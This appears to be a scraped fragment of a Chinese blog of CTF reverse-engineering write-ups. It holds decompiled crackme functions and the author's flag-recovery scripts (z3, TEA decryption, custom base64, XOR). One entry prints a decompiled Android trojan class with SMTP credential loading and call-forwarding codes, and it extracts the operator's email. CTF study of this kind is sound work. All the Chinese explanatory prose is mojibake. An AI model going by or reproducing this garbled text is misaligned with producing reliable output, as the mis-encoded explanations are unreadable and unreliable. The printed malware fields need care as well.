CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0); v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_41119F, 0, 0, 0); CloseHandle(hObject); CloseHandle(v5); while ( dword_418008 != -1 ) ; sub_411190(); CloseHandle(::hObject); return 0; } CreateThread API ä¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼Œè¿™é“é¢˜æ¶‰åŠåˆ°å¤šçº¿ç¨‹ã€‚CreateMutex åˆ›å»ºä¸€ä¸ªäº’æ–¥ä½“ï¼Œç”¨äºé˜²æ­¢å¤šçº¿ç¨‹ä¸­å‡ºç°èµ„æºäº‰ç”¨ï¼Œå³å¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å†™åŒä¸€ä¸ªèµ„æºçš„æƒ…å†µï¼Œæ‰€åˆ›å»ºçš„äº’æ–¥ä½“çš„å¥æŸ„ä¼šå­˜åˆ°å…¨å±€å˜é‡ hObject ä¸­ï¼ˆæ³¨æ„å‰é¢çš„ä¸¤ä¸ªå†’å·è¡¨ç¤ºæ˜¯å…¨å±€å˜é‡ï¼Œè€Œä¸æ˜¯è¿™ä¸ªå‡½æ•°é‡ŒåŒåçš„å±€éƒ¨å˜é‡ï¼‰ã€‚è¿™é‡Œåˆ›å»ºäº†ä¸¤ä¸ªçº¿ç¨‹ï¼Œå…¥å£ç‚¹åˆ†åˆ«ä½äºå‡½æ•° StartAddress å’Œ sub_41119F StartAddressçº¿ç¨‹å†…éƒ¨å‡½æ•° void __stdcall StartAddress_0(int a1) { while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 \u003e -1 ) { sub_41112C((int)Source, (char *)dword_418008); --dword_418008; Sleep(0x64u); } ReleaseMutex(hObject); } } //sub_41112Cå†…éƒ¨åµŒå¥—sub_411940 void __cdecl sub_411940(int a1, char *a2) { char v2; // [esp+D3h] [ebp-5h] v2 = a2[a1]; if ( (v2 \u003c 'a' || v2 \u003e 'z') \u0026\u0026 (v2 \u003c 'A' || v2 \u003e 'Z') ) exit(0); if ( v2 \u003c 'a' || v2 \u003e 'z' ) a2[a1] = off_418000[0][a2[a1] - 38]; else a2[a1] = off_418000[0][a2[a1] - 96]; } è¿™é‡Œå‘ç°ä¸ªå°é—®é¢˜ï¼Œé€šè¿‡å‡½æ•°å®ç°åˆ¤æ–­sub__41112Cå‡½æ•°å’Œå†…éƒ¨sub_411940å‡½æ•°å‚æ•°é¡ºåºé¢ å€’ï¼ŒçŒœæµ‹æ˜¯stdcallå’Œcdeclä¼ å‚é¡ºåºä¸åŒå¼•èµ·çš„ï¼Œä½†idaè¯†åˆ«é”™è¯¯ sub_41119Fçº¿ç¨‹å†…éƒ¨å‡½æ•° void __stdcall sub_411B10(int a1) { while ( 1 ) { WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 \u003e -1 ) { Sleep(0x64u); --dword_418008; } ReleaseMutex(hObject); } } è‡ªå·±åšçš„æ—¶å€™ä¸æ‡‚å¤šçº¿ç¨‹ï¼Œä»¥ä¸ºè¿™ä¸ªå‡½æ•°æ²¡å•¥ç”¨ï¼Œå¯¼è‡´å¡æ­» æŸ¥ MSDN çŸ¥ï¼Œå¯ä»¥ç”¨ WaitForSingleObject ç­‰å¾…äº’æ–¥ä½“çš„ä½¿ç”¨æƒï¼ˆownershipï¼‰ç©ºé—²å‡ºæ¥ï¼Œå¹¶è·å–ä½¿ç”¨æƒï¼Œç„¶åå†è®¿é—®å’Œå…¶ä»–çº¿ç¨‹å…±äº«çš„èµ„æºï¼Œè®¿é—®å®Œåï¼Œç”¨ ReleaseMutex é‡Šæ”¾ä½¿ç”¨æƒï¼Œç»™å…¶ä»–çº¿ç¨‹ä½¿ç”¨çš„æœºä¼š4ã€‚é€šè¿‡æ¯”è¾ƒä¸¤çº¿ç¨‹çš„å‡½æ•°ï¼Œå¾ˆå®¹æ˜“çŸ¥é“æ‰€å…±äº«çš„èµ„æºå°±æ˜¯å…¨å±€å˜é‡ dword_418008ï¼Œå®ƒçš„åˆå€¼æ˜¯ 29ã€‚è€Œè¿™ä¸¤ä¸ªçº¿ç¨‹ä¸€å‰ä¸€ååˆ›å»ºï¼Œç†è®ºä¸Šæ˜¯ StartAddress å…ˆè·å¾—ä½¿ç”¨æƒï¼Œåæ¥çš„ sub_41119F è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œå‰è€…æ‰§è¡Œä¸€æ¬¡å¾ªç¯åé‡Šæ”¾ä½¿ç”¨æƒï¼Œä¸æ­¤åŒæ—¶åè€…ç­‰å¾…ç»“æŸã€è·å¾—ä½¿ç”¨æƒï¼Œè¿›å…¥å¾ªç¯ï¼Œå¾ªç¯å®Œåé‡Šæ”¾ä½¿ç”¨æƒï¼Œå‰è€…åˆè·å¾—ä½¿ç”¨æƒï¼Œå¦‚æ­¤å¾ªç¯å¾€å¤ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸¤ä¸ªçº¿ç¨‹çš„æ“ä½œæ˜¯äº¤æ›¿è¿›è¡Œçš„ã€‚ æ•…å®ç°çš„åŠŸèƒ½æ˜¯å¥‡æ•°ä½åŠ å¯†ï¼Œå¶æ•°ä½ä¸å˜ è¿˜æ˜¯å–œæ¬¢ç›´æ¥çˆ† table = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\\0\" cmp_code = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\\0\" inp = \"\" for i in range(0,29): if(i % 2 == 0): inp += cmp_code[i] else: for j in range(0,127): if ( (j \u003c ord('a') or j \u003e ord('z')) and (j \u003c ord('A') or j \u003e ord('Z')) ): continue if ( j \u003c 97 or j \u003e 122 ): if(cmp_code[i] == table[j - 38]): inp += chr(j) else: if(cmp_code[i] == table[j - 96]): inp += chr(j) print(inp) #outputï¼šThisisthreadofwindowshahaIsES çˆ†ç ´ä¸­é—´åˆå‘ç°äº†ä¸ªç®—æ³•çš„å°é—®é¢˜ï¼ŒæŒ‰è¿™æ ·åŠ å¯†tableä¸­çš„ç¬¬ä¸€ä½æ°¸è¿œä¹Ÿç”¨ä¸åˆ°ï¼Œä¸”å¿…é¡»æœ€ååŠ ä¸ª\\0æ‰èƒ½é˜²æ­¢æ•°ç»„ä¸‹æ ‡è¶Šç•Œï¼Œå¯èƒ½æ˜¯å‡ºé¢˜äººçš„ç–å¿½ï¼Œè¿˜æ˜¯æ•…æ„ï¼Ÿ æœ€åè¿˜æœ‰ä¸ªå°å‘ï¼Œè¾“å…¥åº”è¯¥ä¸º30ä½ï¼Œä½†ç¨‹åºéªŒè¯çš„å³æˆ‘ä»¬æ‰€èƒ½è§£å‡ºçš„åªæœ‰29ä½ï¼Œåº”ä¸ºå¤šè§£ï¼Œä½†å‡ºé¢˜äººä»¥åŠbuuå¹³å°ä¸Šé»˜è®¤æœ€åä¸€ä½æ˜¯Eæ‰èƒ½correct æ€»ç»“ä¸€ä¸‹ï¼Œè¿™é“é¢˜é›†åˆäº†upxè„±å£³ï¼Œåè°ƒè¯•ï¼ˆä½†å¯ä»¥åƒæˆ‘ä¸€æ ·åªé™æ€åˆ†æï¼‰ï¼Œå¤šçº¿ç¨‹è¿™ä¹ˆå¤šçŸ¥è¯†ç‚¹ï¼Œå¯ä»¥è¯´ååˆ†ä¼˜ç§€äº†ï¼Œä¹Ÿè®©æˆ‘å­¦åˆ°äº†å¾ˆå¤š ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:10:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level2 æ²¡å•¥è¯´çš„ï¼Œçº¯æ–°æ‰‹é¢˜ï¼Œupxè„±ä¸ªå£³ï¼Œidaæ‰“å¼€æ±‡ç¼–mainå‡½æ•°å°±èƒ½çœ‹åˆ°flag{Just_upx_-d} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:11:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"ç›¸å†Œ å®‰å“é€†å‘ï¼Œå°±å¯¹ç€jebä½¿åŠ²ç¿»å§ æœ‰ä¸€ä¸ªC2ç±»æ¯”è¾ƒæœ‰ç”¨ package cn.baidujiayuan.ver5304; import android.content.Context; import com.net.cn.NativeMethod; import it.sauronsoftware.base64.Base64; import java.text.ParsePosition; import java.text.SimpleDateFormat; import java.util.Date; public class C2 { public static final String CANCELNUMBER = \"%23%2321%23\"; public static final String MAILFROME = null; public static final String MAILHOST = \"smtp.163.com\"; public static final String MAILPASS = null; public static final String MAILSERVER = null; public static final String MAILUSER = null; public static final String MOVENUMBER = \"**21*121%23\"; public static final String PORT = \"25\"; public static final String date = \"2115-11-1\"; public static final String phoneNumber; static { System.loadLibrary(\"core\"); C2.MAILSERVER = Base64.decode(NativeMethod.m()); C2.MAILUSER = Base64.decode(NativeMethod.m()); C2.MAILPASS = Base64.decode(NativeMethod.pwd()); C2.MAILFROME = Base64.decode(NativeMethod.m()); C2.phoneNumber = Base64.decode(NativeMethod.p()); } public C2() { super(); } public static boolean isFilter(Context arg6) { boolean v2 = C2.strToDateLong(\"2115-11-1\").getTime() - new Date().getTime() \u003c 0 ? true : false; return v2; } public static boolean isServerFilter(Context arg5) { boolean v2 = false; if(arg5.getSharedPreferences(\"X\", 0).getString(\"m\", \"1\").equals(\"1\")) { v2 = true; } return v2; } public static Date strToDateLong(String arg4) { return new SimpleDateFormat(\"yyyy-MM-dd\").parse(arg4, new ParsePosition(0)); } } å¯ä»¥çœ‹åˆ°åƒMAILUSER``MAILPASSè¿™æ ·çš„å˜é‡å¾ˆåƒæ˜¯æˆ‘ä»¬æ‰€è¦çš„é‚®ç®± ä½†è¿˜æ˜¯å¯¹java/jebä¸ç†Ÿæ‚‰ï¼Œå•çŸ¥é“JNIå´ä¸çŸ¥é“NativeMethodï¼Œè¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆå†…ç½®å‡½æ•°ï¼Œæ‰¾åŠå¤©ä¹Ÿæ‰¾ä¸åˆ°ï¼Œåé¢æŸ¥åˆ°æœ‰å…³javaä¸­çš„nativeæ‰æ‡‚åŸæ¥å’ŒJNIåŸºæœ¬æ˜¯ä¸€ä¸ªä¸œè¥¿ äºæ˜¯è§£å‹apkï¼Œåœ¨libæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°soæ–‡ä»¶ï¼Œæ‹–è¿›idaï¼Œæ‰¾exportï¼Œçœ‹åˆ°äº†Java_com_net_cn_NativeMethod_mï¼Œè·Ÿè¿›å»å°±èƒ½çœ‹åˆ°base64ç¼–ç çš„å­—ç¬¦ä¸²MTgyMTg0NjUxMjVAMTYzLmNvbQ== base64decodeå¾—é‚®ç®±18218465125@163.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:12:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[MRCTF2020]Xor å¼‚æˆ–æ‹¿flag ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:13:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[HDCTF2019]Maze upxè„±å£³ï¼Œè¿›ida æœ‰ä¸ªèŠ±æŒ‡ä»¤ï¼Œç¨å¾®ä¿®ä¸€ä¸‹ï¼Œå°±èƒ½F5äº†ï¼Œmainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [esp+10h] [ebp-14h] char v5[16]; // [esp+14h] [ebp-10h] BYREF printf(\"Go through the maze to get the flag!\\n\"); scanf(\"%14s\", v5); for ( i = 0; i \u003c= 13; ++i ) { switch ( v5[i] ) { case 'a': --dword_408078; break; case 'd': ++dword_408078; break; case 's': --dword_40807C; break; case 'w': ++dword_40807C; break; default: continue; } } if ( dword_408078 == 5 \u0026\u0026 dword_40807C == -4 ) { printf(\"Congratulations!\\n\"); printf(\"Here is the flag:flag{%s}\\n\", v5); } else { printf(\"Try again...\\n\"); } return 0; } stringçª—å£ç¿»ç¿»å°±èƒ½æ‰¾åˆ°åœ°å›¾ï¼Œæ€»å…±70ä¸ªå­—ç¬¦ï¼Œè¯•äº†è¯•åº”è¯¥æ˜¯10*7 '*', '*', '*', '*', '*', '*', '*', '+', '*', '*' '*', '*', '*', '*', '*', '*', '*', ' ', '*', '*' '*', '*', '*', '*', ' ', ' ', ' ', ' ', '*', '*' '*', '*', ' ', ' ', ' ', '*', '*', '*', '*', '*' '*', '*', ' ', '*', '*', 'F', '*', '*', '*', '*' '*', '*', ' ', ' ', ' ', ' ', '*', '*', '*', '*' '*', '*', '*', '*', '*', '*', '*', '*', '*', '*' æ‰‹åŠ¨èµ°ä¸€ä¸‹ssaaasaassdddwï¼Œå³flag{ssaaasaassdddw} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:14:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[GWCTF 2019]xxor mainå‡½æ•° // local variable allocation has failed, the output may be wrong! __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] int v6[6]; // [rsp+10h] [rbp-60h] OVERLAPPED BYREF __int128 v7; // [rsp+28h] [rbp-48h] int v8[6]; // [rsp+40h] [rbp-30h] OVERLAPPED BYREF __int128 v9; // [rsp+58h] [rbp-18h] unsigned __int64 v10; // [rsp+68h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\"Let us play a game?\"); puts(\"you have six chances to input\"); puts(\"Come on!\"); *(_OWORD *)v6 = 0uLL; *(_QWORD *)\u0026v6[4] = 0LL; v7 = 0uLL; for ( i = 0; i \u003c= 5; ++i ) { printf(\"%s\", \"input: \"); __isoc99_scanf(\"%d\", \u0026v6[i]); } *(_OWORD *)v8 = 0uLL; *(_QWORD *)\u0026v8[4] = 0LL; v9 = 0uLL; for ( j = 0; j \u003c= 4; j += 2 ) { lowInt = v6[j]; highInt = v6[j + 1]; teaCrypt(\u0026lowInt, \u0026dword_601060); v8[j] = lowInt; v8[j + 1] = highInt; } if ( (unsigned int)sub_400770(v8) != 1 ) { puts(\"NO NO NO~ \"); exit(0); } puts(\"Congratulation!\\n\"); puts(\"You seccess half\\n\"); puts(\"Do not forget to change input to hex and combine~\\n\"); puts(\"ByeBye\"); return 0LL; } è¾“å…¥å…­ä¸²æ•°å­—ï¼Œå…ˆè¿›è¡ŒteaåŠ å¯†ï¼Œç„¶åè¿›sub_400770è¦è§£ä¸€ä¸ªå°æ–¹ç¨‹ç»„ __int64 __fastcall teaCrypt(unsigned int *a1, _DWORD *a2) { __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i \u003c= 0x3F; ++i ) { v5 += 1166789954; v3 += (v4 + v5 + 11) ^ ((v4 \u003c\u003c 6) + *a2) ^ ((v4 \u003e\u003e 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 \u003c\u003c 6) + a2[2]) ^ ((v3 \u003e\u003e 9) + a2[3]) ^ 0x10; } *a1 = v3; result = v4; a1[1] = v4; return result; } __int64 __fastcall sub_400770(int *a1) { __int64 result; // rax if ( a1[2] - a1[3] == 2225223423LL \u0026\u0026 a1[3] + a1[4] == 4201428739LL \u0026\u0026 a1[2] - a1[4] == 1121399208LL \u0026\u0026 *a1 == -548868226 \u0026\u0026 a1[5] == -2064448480 \u0026\u0026 a1[1] == 550153460 ) { puts(\"good!\"); result = 1LL; } else { puts(\"Wrong!\"); result = 0LL; } return result; } é€†è¿‡æ¥å…ˆz3è§£æ–¹ç¨‹ from z3 import * s = z3.Solver() a2 = Int(\"a1[2]\") a3 = Int(\"a1[3]\") a4 = Int(\"a1[4]\") s.add(a2 - a3 == 0x84A236FF) s.add(a3 + a4 == 0xFA6CB703) s.add(a2 - a4 == 0x42D731A8) s.check() print(s.model()) # \u0026\u0026 *a1 == -548868226 # \u0026\u0026 a1[5] == -2064448480 # \u0026\u0026 a1[1] == 550153460 # outputï¼š[a1[2] = 3774025685, a1[3] = 1548802262, a1[4] = 2652626477] ç„¶åteaè§£å¯† #include\u003cstdio.h\u003e int main(){ unsigned int a1[6] = {0xDF48EF7E, 0x20CAACF4, 3774025685, 1548802262, 2652626477, 0x84F30420}; int key[] = {2, 2, 3, 4}; for(int i = 0 ;i \u003c= 2; i++){ unsigned int lowbytes = a1[2 * i]; unsigned int highbytes = a1[2 * i + 1]; for(int j = 0x3f; j \u003e= 0; j--){ int delta = 1166789954 * (j + 1); highbytes -= (lowbytes + delta + 20) ^ ((lowbytes \u003c\u003c 6) + key[2]) ^ ((lowbytes \u003e\u003e 9) + key[3]) ^ 0x10; lowbytes -= (highbytes + delta + 11) ^ ((highbytes \u003c\u003c 6) + key[0]) ^ ((highbytes \u003e\u003e 9) + key[1]) ^ 0x20; } a1[2 * i] = lowbytes; a1[2 * i + 1] = highbytes; } for(int i = 0; i \u003c= 5; i++){ printf(\"%x\", a1[i]); } return 0; } //outputï¼š666c61677b72655f69735f6772656174217dâ long_to_bytesä¸€ä¸‹æ‹¿flag{re_is_great!} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:15:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[MRCTF2020]hello_world_go mainå‡½æ•° void __cdecl main_main() { int v0; // edi __int64 v1; // rsi __int64 v2; // r8 __int64 v3; // r9 __int64 v4; // r8 __int64 v5; // r9 int v6; // edx __int64 v7; // r8 __int64 v8; // r9 __int64 v9; // rcx __int64 v10; // rax int v11; // edx __int64 v12; // rax __int64 *v13; // [rsp+8h] [rbp-A8h] char v14; // [rsp+18h] [rbp-98h] __int64 v15; // [rsp+20h] [rbp-90h] __int64 v16; // [rsp+28h] [rbp-88h] __int64 v17; // [rsp+58h] [rbp-58h] __int64 *v18; // [rsp+60h] [rbp-50h] __int128 v19; // [rsp+68h] [rbp-48h] BYREF void *v20; // [rsp+78h] [rbp-38h] BYREF void **v21; // [rsp+80h] [rbp-30h] BYREF __int128 v22; // [rsp+88h] [rbp-28h] BYREF __int128 v23; // [rsp+98h] [rbp-18h] BYREF if ( (unsigned __int64)\u0026v21 \u003c= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); runtime_newobject(v0, v1); v18 = v13; *(_QWORD *)\u0026v23 = \u0026unk_4AC9C0; *((_QWORD *)\u0026v23 + 1) = \u0026off_4EA530; fmt_Fprint( v0, v1, (unsigned int)\u0026v23, (unsigned int)\u0026unk_4AC9C0, v2, v3, (__int64)\u0026go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026v23); *(_QWORD *)\u0026v22 = \u0026unk_4A96A0; *((_QWORD *)\u0026v22 + 1) = v18; fmt_Fscanf( v0, v1, (unsigned int)\u0026go_itab__os_File_io_Reader, (unsigned int)\u0026v22, v4, v5, (__int64)\u0026go_itab__os_File_io_Reader, os_Stdin, (__int64)\u0026unk_4D07C9, 2LL, (__int64)\u0026v22, 1LL); v9 = v18[1]; v10 = *v18; if ( v9 != 24 ) goto LABEL_3; v17 = *v18; runtime_memequal(v0, v1, v6, (unsigned int)aFlagHelloWorld, v7, v8, (__int64)aFlagHelloWorld, v10); if ( !v14 ) { LOBYTE(v10) = v17; LODWORD(v9) = 24; LABEL_3: runtime_cmpstring(v0, v1, (unsigned int)aFlagHelloWorld, v9, v7, v8, (__int64)aFlagHelloWorld, 24LL, v10); if ( v15 \u003e= 0 ) v12 = 1LL; else v12 = -1LL; goto LABEL_5; } v12 = 0LL; LABEL_5: if ( v12 ) { *(_QWORD *)\u0026v19 = \u0026unk_4AC9C0; *((_QWORD *)\u0026v19 + 1) = \u0026off_4EA550; fmt_Fprintln( v0, v1, v11, (unsigned int)\u0026go_itab__os_File_io_Writer, v7, v8, (__int64)\u0026go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026v19, 1LL, 1LL, v16); } else { v20 = \u0026unk_4AC9C0; v21 = \u0026off_4EA540; fmt_Fprintln( v0, v1, v11, (unsigned int)\u0026go_itab__os_File_io_Writer, v7, v8, (__int64)\u0026go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026v20, 1LL, 1LL, v16); } } ç¿»aFlagHelloWorldå°±èƒ½çœ‹åˆ°flag{hello_world_gogogo} è¿™é“é¢˜æœ€æœ‰ç”¨çš„æ˜¯è®©æˆ‘è£…äº†idaGolangHelper ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:16:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level3 mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rax char v5; // [rsp+Fh] [rbp-41h] char v6[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v7; // [rsp+48h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\"Try my base64 program?.....\\n\u003e\"); __isoc99_scanf(\"%20s\", v6); v5 = time(0LL); srand(v5); if ( (rand() \u0026 1) != 0 ) { v3 = base64_encode(v6); puts(v3); puts(\"Is there something wrong?\"); } else { puts(\"Sorry I think it's not prepared yet....\"); puts(\"And I get a strange string from my program which is different from the standard base64:\"); puts(\"d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\"); puts(\"What's wrong??\"); } return 0; } å¯ä»¥çœ‹å‡ºæœ€ç»ˆflagæ˜¯è¿™æ®µå­—ç¬¦ä¸²d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==base64è§£å¯†å¾—åˆ°çš„ ä½†æ ‡å‡†base64è§£å¯†å‡ºæ¥æ˜¯ä¹±ç ï¼Œè¯´æ˜å¯¹base64åšäº†æ‰‹è„šã€ å…¶å®æ˜¯åœ¨startå‡½æ•°ä¸­è—äº†ä¸€ä¸ªæ¢è¡¨çš„æ“ä½œ __int64 O_OLookAtYou() { __int64 result; // rax char v1; // [rsp+1h] [rbp-5h] int i; // [rsp+2h] [rbp-4h] for ( i = 0; i \u003c= 9; ++i ) { v1 = base64_table[i]; base64_table[i] = base64_table[19 - i]; result = 19 - i; base64_table[result] = v1; } return result; } å¯ä»¥è®¡ç®—æ‹¿åˆ°æ–°è¡¨ï¼Œä½†æ›´å¥½çš„æ–¹æ³•æ˜¯ç›´æ¥åŠ¨è°ƒå°±èƒ½æ‹¿åˆ°æ–°è¡¨ å†™è„šæœ¬æ‹¿flag import base64 new_table = \"TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" standard_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" enc = \"d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\" table = str.maketrans(standard_table, new_table) print(base64.b64decode(enc.translate(table))) #outputï¼šb'wctf2020{Base64_is_the_start_of_reverse}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:17:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn4]IgniteMe mainå‡½æ•° void __thiscall __noreturn start(char *Format) { DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, \u0026NumberOfBytesWritten, 0); Scanf((const char *const)NumberOfBytesWritten); if ( check() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, \u0026NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, \u0026NumberOfBytesWritten, 0); ExitProcess(0); } ä¸»è¦å†…å®¹åœ¨checkå‡½æ•° int sub_401050() { int v1; // [esp+0h] [ebp-Ch] int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v1 = strlen((int)input); v4 = key(); for ( i = v1 - 1; i \u003e= 0; --i ) { byte_403180[i] = v4 ^ input[i]; v4 = input[i]; } for ( j = 0; j \u003c 0x27; ++j ) { if ( byte_403180[j] != (unsigned __int8)enc[j] ) return 0; } return 1; } å¼‚æˆ–æ‹¿flag enc = [0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C, 0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E, 0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13, 0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69, 0x00] key = 4 flag = [0] * 40 for i in range(38, -1, -1): flag[i] = enc[i] ^ key key = flag[i] for i in flag: print(chr(i), end = \"\") #output:R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:18:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn6]Overlong ç”±é¢˜ç›®ç»“åˆæ•°ç»„çŒœæµ‹æ•°æ®æ²¡æœ‰æ‰“å°å®Œå…¨ æŠŠä»£ç dumpä¸‹æ¥ï¼Œå¾ªç¯æ¬¡æ•°åŠ å¤§ï¼Œè¿è¡Œå³å¯æ‹¿flag #include\u003cstdio.h\u003e int cal(char *c, char *byte){ int v3; char v4; if ( (int)(unsigned char)*byte \u003e\u003e 3 == 30 ){ v4 = byte[3] \u0026 0x3F | ((byte[2] \u0026 0x3F) \u003c\u003c 6); v3 = 4; } else if ( (int)(unsigned char)*byte \u003e\u003e 4 == 14 ){ v4 = byte[2] \u0026 0x3F | ((byte[1] \u0026 0x3F) \u003c\u003c 6); v3 = 3; } else if ( (int)(unsigned char)*byte \u003e\u003e 5 == 6 ){ v4 = byte[1] \u0026 0x3F | ((*byte \u0026 0x1F) \u003c\u003c 6); v3 = 2; } else{ v4 = *byte; v3 = 1; } *c = v4; return v3; } int main(){ unsigned char bytecode[176] = { 0xE0, 0x81, 0x89, 0xC0, 0xA0, 0xC1, 0xAE, 0xE0, 0x81, 0xA5, 0xC1, 0xB6, 0xF0, 0x80, 0x81, 0xA5, 0xE0, 0x81, 0xB2, 0xF0, 0x80, 0x80, 0xA0, 0xE0, 0x81, 0xA2, 0x72, 0x6F, 0xC1, 0xAB, 0x65, 0xE0, 0x80, 0xA0, 0xE0, 0x81, 0xB4, 0xE0, 0x81, 0xA8, 0xC1, 0xA5, 0x20, 0xC1, 0xA5, 0xE0, 0x81, 0xAE, 0x63, 0xC1, 0xAF, 0xE0, 0x81, 0xA4, 0xF0, 0x80, 0x81, 0xA9, 0x6E, 0xC1, 0xA7, 0xC0, 0xBA, 0x20, 0x49, 0xF0, 0x80, 0x81, 0x9F, 0xC1, 0xA1, 0xC1, 0x9F, 0xC1, 0x8D, 0xE0, 0x81, 0x9F, 0xC1, 0xB4, 0xF0, 0x80, 0x81, 0x9F, 0xF0, 0x80, 0x81, 0xA8, 0xC1, 0x9F, 0xF0, 0x80, 0x81, 0xA5, 0xE0, 0x81, 0x9F, 0xC1, 0xA5, 0xE0, 0x81, 0x9F, 0xF0, 0x80, 0x81, 0xAE, 0xC1, 0x9F, 0xF0, 0x80, 0x81, 0x83, 0xC1, 0x9F, 0xE0, 0x81, 0xAF, 0xE0, 0x81, 0x9F, 0xC1, 0x84, 0x5F, 0xE0, 0x81, 0xA9, 0xF0, 0x80, 0x81, 0x9F, 0x6E, 0xE0, 0x81, 0x9F, 0xE0, 0x81, 0xA7, 0xE0, 0x81, 0x80, 0xF0, 0x80, 0x81, 0xA6, 0xF0, 0x80, 0x81, 0xAC, 0xE0, 0x81, 0xA1, 0xC1, 0xB2, 0xC1, 0xA5, 0xF0, 0x80, 0x80, 0xAD, 0xF0, 0x80, 0x81, 0xAF, 0x6E, 0xC0, 0xAE, 0xF0, 0x80, 0x81, 0xA3, 0x6F, 0xF0, 0x80, 0x81, 0xAD, 0x00 }; char *byte = bytecode; char c; char flag[100]; for(int i = 0; i \u003c= 100; i++){ byte += cal(\u0026c, byte); putchar(c); } } //outputï¼šI never broke the encoding: I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:19:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn3]Challenge1 mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { unsigned __int8 Buffer[128]; // [esp+0h] [ebp-94h] BYREF char *Str1; // [esp+80h] [ebp-14h] char *Str2; // [esp+84h] [ebp-10h] HANDLE v7; // [esp+88h] [ebp-Ch] HANDLE hFile; // [esp+8Ch] [ebp-8h] DWORD NumberOfBytesWritten; // [esp+90h] [ebp-4h] BYREF hFile = GetStdHandle(0xFFFFFFF5); v7 = GetStdHandle(0xFFFFFFF6); Str2 = 